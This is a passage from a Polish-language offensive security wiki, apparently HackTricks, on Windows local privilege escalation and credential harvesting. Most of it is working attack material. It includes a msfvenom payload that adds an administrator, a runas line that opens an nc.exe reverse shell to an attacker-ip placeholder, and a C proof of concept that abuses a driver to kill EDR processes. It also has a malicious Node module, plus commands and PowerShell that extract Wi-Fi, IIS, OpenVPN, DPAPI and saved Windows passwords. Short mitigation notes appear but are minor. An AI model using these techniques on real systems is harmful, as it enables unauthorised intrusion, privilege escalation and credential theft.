echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć binarkę usługi za pomocą metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Działania odzyskiwania

Windows pozwala użytkownikom określić działania, które mają zostać podjęte, jeśli usługa ulegnie awarii. Tę funkcję można skonfigurować tak, aby wskazywała na binary. Jeśli ten binary można zastąpić, możliwa może być privilege escalation. Więcej szczegółów można znaleźć w [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Zainstalowane Applications

Sprawdź **permissions binariów** (może uda się nadpisać jeden z nich i wykonać privilege escalation) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać jakiś specjalny plik, albo czy możesz zmodyfikować jakiś binarny plik, który zostanie uruchomiony przez konto Administratora (schedtasks).

Sposób na znalezienie słabych uprawnień do folderów/plików w systemie to:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ automatycznie ładuje każdy DLL wtyczki znajdujący się w jego podfolderach `plugins`. Jeśli istnieje zapisywalna instalacja portable/copy, podłożenie złośliwej wtyczki daje automatyczne wykonanie kodu wewnątrz `notepad++.exe` przy każdym uruchomieniu (w tym z `DllMain` i callbacków wtyczki).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Sprawdź, czy możesz nadpisać jakiś registry lub binary, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **następną stronę**, aby dowiedzieć się więcej o interesujących **autoruns locations do eskalacji uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Szukaj możliwych **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Jeśli sterownik udostępnia dowolny kernel read/write primitive (częste w źle zaprojektowanych handlerach IOCTL), możesz podnieść uprawnienia, kradnąc token SYSTEM bezpośrednio z pamięci jądra. Zobacz technikę krok po kroku tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

W przypadku błędów race-condition, gdzie podatne wywołanie otwiera kontrolowaną przez atakującego ścieżkę Object Manager, celowe spowolnienie lookup (używając komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Nowoczesne podatności hive pozwalają groom deterministic layouts, abuse writable HKLM/HKU descendants i przekształcać corruption metadanych w kernel paged-pool overflows bez własnego sterownika. Poznaj pełny chain tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Niektóre podpisane sterowniki firm trzecich tworzą swój device object z silnym SDDL przez IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tego flag secure DACL nie jest egzekwowany, gdy urządzenie jest otwierane przez path zawierający dodatkowy component, co pozwala każdemu nieuprzywilejowanemu użytkownikowi uzyskać handle, używając namespace path takiego jak:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, uprzywilejowane IOCTLs udostępnione przez sterownik mogą zostać nadużyte do LPE i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie handle z pełnymi uprawnieniami do dowolnych procesów (token theft / SYSTEM shell przez DuplicateTokenEx/CreateProcessAsUser).
- Nieskrępowany raw disk read/write (offline tampering, techniki boot-time persistence).
- Zamykanie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala na AV/EDR kill z user land przez kernel.

Minimalny wzorzec PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj context wywołującego dla operacji uprzywilejowanych. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie handle.
- Ograniczaj IOCTLs (access masks, METHOD_*, walidacja input) i rozważ modele brokered zamiast bezpośrednich uprawnień kernel.

Detection ideas for defenders
- Monitoruj user-mode opens podejrzanych nazw device (np. \\ .\\amsdk*) i określone sekwencje IOCTL wskazujące na abuse.
- Wymuszaj Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i utrzymuj własne allow/deny lists.


## PATH DLL Hijacking

Jeśli masz **write permissions wewnątrz folderu znajdującego się w PATH** możesz przejąć DLL ładowaną przez proces i **escalate privileges**.

Sprawdź permissions wszystkich folderów w PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Więcej informacji o tym, jak nadużyć ten check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

To jest wariant **Windows uncontrolled search path**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują one prosty import, taki jak `require("foo")`, a oczekiwany moduł jest **missing**.

Node rozwiązuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows to przechodzenie może dojść aż do root dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może finalnie sprawdzać:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **low-privileged user** może utworzyć `C:\node_modules`, może umieścić złośliwy `foo.js` (albo folder package) i czekać, aż **higher-privileged Node/Electron process** rozwiąże brakującą dependency. Payload wykona się w security context procesu ofiary, więc staje się to **LPE** za każdym razem, gdy cel działa jako administrator, z podniesionego scheduled task/service wrapper, albo z automatycznie uruchamianej uprzywilejowanej aplikacji desktopowej.

Jest to szczególnie częste, gdy:

- dependency jest zadeklarowane w `optionalDependencies`
- biblioteka third-party opakowuje `require("foo")` w `try/catch` i kontynuuje po failure
- package został usunięty z production builds, pominięty podczas packagingu albo nie zainstalował się poprawnie
- podatny `require()` znajduje się głęboko w dependency tree, a nie w głównym kodzie aplikacji

### Szukanie podatnych targetów

Użyj **Procmon**, aby potwierdzić ścieżkę resolution:

- Filtruj po `Process Name` = target executable (`node.exe`, EXE aplikacji Electron lub wrapper process)
- Filtruj po `Path` `contains` `node_modules`
- Skup się na `NAME NOT FOUND` oraz końcowym udanym otwarciu w `C:\node_modules`

Przydatne wzorce code-review w rozpakowanych plikach `.asar` lub źródłach aplikacji:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Eksploatacja

1. Zidentyfikuj **brakującą nazwę pakietu** z Procmon lub z analizy źródła.
2. Utwórz katalog root lookup, jeśli jeszcze nie istnieje:
```powershell
mkdir C:\node_modules
```
3. Umieść moduł z dokładnie oczekiwaną nazwą:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Wyzwól aplikację ofiary. Jeśli aplikacja próbuje `require("foo")`, a legalny moduł jest nieobecny, Node może załadować `C:\node_modules\foo.js`.

Przykłady z życia realnego brakujących opcjonalnych modułów, które pasują do tego wzorca, obejmują `bluebird` i `utf-8-validate`, ale **technique** jest elementem wielokrotnego użytku: znajdź dowolny **missing bare import**, który uprzywilejowany proces Windows Node/Electron rozwiąże.

### Detection and hardening ideas

- Alert, gdy użytkownik tworzy `C:\node_modules` albo zapisuje tam nowe pliki `.js` lub pakiety.
- Hunt for high-integrity processes reading from `C:\node_modules\*`.
- Package all runtime dependencies in production and audit `optionalDependencies` usage.
- Review third-party code for silent `try { require("...") } catch {}` patterns.
- Disable optional probes when the library supports it (for example, some `ws` deployments can avoid the legacy `utf-8-validate` probe with `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Sprawdź inne znane komputery zakodowane na sztywno w pliku hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otwarte porty

Sprawdź **ograniczone usługi** z zewnątrz
```bash
netstat -ano #Opened ports?
```
### Tablica routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reguły zapory

[**Sprawdź tę stronę pod kątem poleceń związanych z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(lista reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` może być też znaleziony w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz użytkownika root, możesz nasłuchiwać na dowolnym porcie (za pierwszym razem, gdy użyjesz `nc.exe` do nasłuchiwania na porcie, pojawi się pytanie przez GUI, czy `nc` powinien być dozwolony przez firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz eksplorować system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault przechowuje poświadczenia użytkownika dla serwerów, stron internetowych i innych programów, które **Windows** może **log in the users automatically**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać swoje poświadczenia do Facebooka, Twittera, Gmaila itd., aby automatycznie logować się przez przeglądarki. Ale tak nie jest.

Windows Vault przechowuje poświadczenia, dzięki którym Windows może logować użytkowników automatycznie, co oznacza, że każda **aplikacja Windows, która potrzebuje poświadczeń do uzyskania dostępu do zasobu** (serwera lub strony internetowej) **może skorzystać z tego Credential Managera** i Windows Vault oraz użyć dostarczonych poświadczeń zamiast ciągłego wpisywania nazwy użytkownika i hasła.

Jeśli aplikacje nie współpracują z Credential Manager, nie sądzę, żeby mogły używać poświadczeń dla danego zasobu. Tak więc, jeśli twoja aplikacja chce skorzystać z vault, powinna w jakiś sposób **komunikować się z credential manager i zażądać poświadczeń dla tego zasobu** z domyślnego vault przechowywania.

Użyj `cmdkey`, aby wyświetlić zapisane poświadczenia na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny przez udział SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Używanie `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, używaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. To szyfrowanie wykorzystuje sekret użytkownika lub systemu, aby znacząco zwiększyć entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego pochodzącego z danych logowania użytkownika**. W scenariuszach obejmujących szyfrowanie systemowe wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się razem z master key, który zabezpiecza prywatne klucze użytkownika w tym samym pliku**, zwykle składa się z 64 bajtów losowych danych. (Ważne jest, aby zauważyć, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wylistowanie jego zawartości za pomocą polecenia `dir` w CMD, choć można go wylistować przez PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **mimikatz module** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby to odszyfrować.

**credentials files** chronione przez master password zwykle znajdują się w:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć **mimikatz module** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować.\
Możesz **wyekstrahować wiele DPAPI** **masterkeys** z **memory** za pomocą modułu `sekurlsa::dpapi` (jeśli jesteś root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** są często używane do zadań **scripting** i automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Poświadczenia są chronione przy użyciu **DPAPI**, co zazwyczaj oznacza, że mogą być odszyfrowane tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **decrypt** PS credentials z pliku, który je zawiera, możesz zrobić:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Możesz je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchamiane polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Użyj modułu **Mimikatz** `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wydobyć wiele masterkey DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Ludzie często używają aplikacji StickyNotes na stacjach roboczych Windows do **zapisywania haseł** i innych informacji, nie zdając sobie sprawy, że jest to plik bazy danych. Plik ten znajduje się w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go przeszukać oraz przeanalizować.

### AppCmd.exe

**Zwróć uwagę, że aby odzyskać hasła z AppCmd.exe, musisz być Administratorem i uruchomić to z poziomem High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano tam jakieś **credentials**, które można **odzyskać**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Klucze hosta SSH Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, to prawdopodobnie będzie to zapisany klucz SSH. Jest on przechowywany zaszyfrowany, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie działa i chcesz, aby automatycznie uruchamiała się przy starcie systemu, uruchom:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Wygląda na to, że ta technika nie jest już poprawna. Spróbowałem utworzyć kilka kluczy ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh do maszyny. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz również wyszukiwać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Poświadczenia Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Szukaj pliku o nazwie **SiteList.xml**

### Cached GPP Pasword

Wcześniej dostępna była funkcja, która pozwalała na wdrażanie niestandardowych lokalnych kont administratora na grupie maszyn za pomocą Group Policy Preferences (GPP). Jednak ta metoda miała poważne luki w zabezpieczeniach. Po pierwsze, Group Policy Objects (GPOs), przechowywane jako pliki XML w SYSVOL, mogły być dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, szyfrowane AES256 przy użyciu publicznie udokumentowanego domyślnego klucza, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne ryzyko, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję skanującą lokalnie zbuforowane pliki GPP zawierające pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizacji pliku, pomagając w identyfikacji i naprawie tej luki bezpieczeństwa.

Szukaj w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed W Vista)_ tych plików:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Używanie crackmapexec do uzyskania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład web.config z credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Poświadczenia OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Zapytaj o credentials

